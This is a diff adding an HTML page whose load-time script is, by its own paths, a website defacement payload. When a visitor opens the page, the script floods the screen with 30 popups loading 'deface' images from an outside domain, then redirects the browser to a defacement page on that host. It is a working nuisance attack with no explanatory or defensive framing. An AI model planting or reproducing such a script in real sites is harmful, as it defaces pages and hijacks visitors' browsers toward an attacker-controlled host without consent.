@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang= "ko">
+<head>
+<meta charset="utf-8">
+</head>
+<script language="javascript">
+function open_popup()
+{
+	var i;
+	var w = screen.availWidth - 200;
+	var h = screen.availHeight - 200;
+	var RandValw, RandValh;
+
+	for (i=0; i<30; i++) {	
+		RandValw = Math.floor(Math.random()*(w));
+		RandValh = Math.floor(Math.random()*(h));
+		RandCats = Math.floor(Math.random()*(10));
+ 		window.open(`http://infosecreload.today/defaceimg/${RandCats}.jpg`, `popup${i}`, `width=200, height=200, left=${RandValw}px, top=${RandValh}px, toolbar=no, location=no, directories=no, status=no, menubar=no, resizable=no, scrollbars=no, copyhistory=no`);
+	}
+    window.location.replace("http://infosecreload.today/deface.html");
+}
+</script>
+<body onLoad="javascript:open_popup();" >
+</body>
+</html>
